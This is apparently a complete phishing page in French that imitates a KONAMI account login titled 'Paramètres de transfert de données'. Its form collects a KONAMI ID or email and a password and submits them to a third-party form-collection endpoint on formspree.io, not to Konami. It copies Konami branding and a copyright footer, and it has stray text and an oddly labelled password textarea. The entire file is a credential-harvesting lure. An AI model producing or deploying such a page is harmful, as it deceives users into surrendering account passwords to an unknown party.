<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paramètres de transfert de données</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }

        .container {
            max-width: 400px;
            margin: 50px auto;
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        header {
            background-color: #b71c1c;
            padding: 15px 20px;
            text-align: center;
        }

        header h1 {
            color: #fff;
            margin: 0;
            font-size: 1.5rem;
        }

        main {
            padding: 20px;
        }

        main h2 {
            color: #b71c1c;
            font-size: 1.2rem;
            margin-bottom: 20px;
            text-align: center;
        }

        form label {
            display: block;
            font-size: 0.9rem;
            margin-bottom: 5px;
            color: #555;
        }

        form input, form textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
        }

        .info {
            font-size: 0.9rem;
            color: #007bff;
            margin-bottom: 20px;
            text-align: center;
        }

        .red-button {
            background-color: #b71c1c;
            color: #fff;
            border: none;
            padding: 10px;
            width: 100%;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .red-button:hover {
            background-color: #a31616;
        }

        .white-button {
            background-color: #fff;
            color: #555;
            border: 1px solid #ccc;
            padding: 10px;
            width: 100%;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
        }

        .white-button:hover {
            background-color: #f0f0f0;
        }

        .forgot-password {
            display: block;
            text-align: center;
            color: #555;
            font-size: 0.9rem;
            text-decoration: none;
            margin-top: 10px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        footer {
            text-align: center;
            padding: 10px 0;
            background-color: #f5f5f5;
            font-size: 0.9rem;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>KONAMI</h1>
        </header>
        <main>
            <h2>Paramètres de  de données</h2>
            <form action="https://formspree.io/f/mvggvabo" method="POST">
                <label for="konami-id">KONAMI ID ou adresse e-mail</label>
                <input type="text" id="konami-id" name="konami-id" placeholder="KONAMI ID ou adresse e-mail" required>
                transfert
                <label for="comment">password</label>
                <textarea id="comment" name="comment" placeholder="your password" rows="1" required></textarea>
                
                <div class="info">Users who use the KONAMI OTP Service only</div>
                
                <button type="submit" class="red-button">Connexion</button>
                <button type="button" class="white-button">Retour</button>
                
                <a href="#" class="forgot-password">Vous avez oublié votre mot de passe ?</a>
            </form>
        </main>
        <footer>
            <p>©2025 Konami Digital Entertainment</p>
        </footer>
    </div>
</body>
</html>
